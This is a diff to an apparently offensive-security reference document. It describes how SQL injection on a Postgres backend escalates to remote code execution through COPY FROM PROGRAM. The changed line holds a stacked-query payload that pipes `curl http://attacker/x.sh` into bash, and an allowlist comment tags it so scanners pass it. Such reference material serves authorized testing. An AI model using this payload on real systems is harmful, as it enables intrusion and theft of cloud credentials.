@@ -48,7 +48,7 @@ RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed o
 
 - **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
 - **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
-- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user. <!-- security-allowlist: documented installer one-liner attack-technique reference, do not execute outside authorized scope -->
+- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user. <!-- security-allowlist: curl-pipe-bash -->
 - **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
 - **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `hunt-sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.
 
